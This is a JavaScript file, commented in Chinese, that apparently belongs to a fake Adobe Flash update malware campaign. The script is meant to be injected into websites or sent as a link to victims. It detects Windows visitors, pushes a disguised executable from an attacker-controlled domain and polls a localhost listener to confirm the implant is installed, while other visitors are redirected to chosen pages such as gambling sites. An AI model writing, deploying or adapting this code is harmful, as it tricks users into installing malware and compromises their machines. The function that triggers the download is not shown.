var ttarget = "https://flash-pop2-domain.com"; //包含js、css等静态资源的服务的域名
var target_file = "https://flash-pop2-domain.com/adobe/AdobeFlash.exe"; // 点击下载的flash地址
var bc_link = "https://指定页面/#/reg/bteq40"; // 要跳转到的指定页面，若不设置则跳转到document.referrer
var pb_word = "/flash-pop2-domain.com"; // "/"+ttarget中的域名
var l_url = "http://localhost:1341"; // 本地监听的服务
var l_res = "hello"; // 本地监听的服务返回的内容

var a_type = 3; // 应用场景 0:源码中插入js； 1：修改导航菜单；2：直接发送flash的页面地址给受害者  3:源码中插入js，不判断是否安装

// 根据ua判断当前系统，除了Windows，其余全部跳转到正常页面，如：博彩
var u = navigator.userAgent, app = navigator.appVersion;
if(u.toLowerCase().indexOf('windows') == -1 && app.toLowerCase().indexOf('windows') == -1){ // 非Windows不检查check
    if(a_type == 0){ // 正常，不做任何操作；非Windows，未安装
        
    }else if(a_type == 1){// 这种情况下应该有document.referrer
        // 判断是否设置了指定页面
        if(bc_link.length != 0 ){
            document.location.href = bc_link
        }else{
            if(document.referrer.indexOf(pb_word) != -1){
                document.location.href = document.referrer    
            }
        }
    }else if(a_type == 2){ //这种情况下通常没有document.referrer
            document.location.href = bc_link
    }
    // 跳转到上个页面或其他页面
    // if(document.referrer.length == 0 || document.referrer.indexOf(pb_word) != -1){
    //     // 判断是否设置了指定页面
    //     if(bc_link.length != 0 ){
    //         document.location.href = bc_link
    //     }else{
    //         document.location.href = document.referrer
    //     }
    // }else{
    //     document.location.href = document.referrer
    // }
}else{ //Windows下检查check
    if (a_type == 3){
        update();
    }else{
        check();    
    }
}


// 请求本地服务，点击后安装检测
function requestss() {
    console.log("requestss");
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function(){
       if(xhr.readyState == 4){
        if((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {
            if(xhr.responseText == l_res){ // 用于判断是否为本地安装的服务
                console.log("success");
                // document.location = document.referrer;
                // 跳转到上个页面或其他页面
                if(a_type == 0){
                    console.log("页面刷新");
                    document.location.reload();
                }else if(a_type == 1){
                    // 判断是否设置了指定页面
                    if(bc_link.length != 0 ){
                        document.location.href = bc_link
                    }else{
                        if(document.referrer.indexOf(pb_word) != -1){
                            document.location.href = document.referrer    
                        }
                    }
                }else if(a_type == 2){
                    document.location.href = bc_link
                }
            }
        } else {
        }
       }
    };
    xhr.open("GET", l_url, true);
    xhr.send(null);
}

function intervalRequests()
{
    if (a_type != 3){
        console.log("intervalRequests");
        setInterval(requestss,10000);
    }
}
// 判断当前是否已安装flash
function check(){
    let xhr  = new XMLHttpRequest();
    xhr.onreadystatechange = function(){
        if(xhr.readyState == 4){
            console.log("34");
            if((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {
                if(xhr.responseText == "hello"){
                    console.log("success");
                    // update();
                    console.log("AdobeFlash has installed,now u can happy");
                    if(a_type == 0){
                    }else if(a_type == 1){
                        // 判断是否设置了指定页面
                        if(bc_link.length != 0 ){
                            document.location.href = bc_link
                        }else{
                            if(document.referrer.indexOf(pb_word) != -1){
                                document.location.href = document.referrer    
                            }
                        }
                    }else if(a_type == 2){
                        document.location.href = bc_link
                    }
                    return 1;
                }else{ 
                    console.log("AdobeFlash安装失败或端口被占用");
                    update();
                    return 1;
                }
            } else {
                console.log("AdobeFlash未安装");
                update(); // 为什么没起作用？？？--找到原因了，因为端口不通报错导致的-已解决
                return 1;
            }
        }

        
    };
    xhr.open("GET", l_url, true);
    xhr.send(null);
    
}
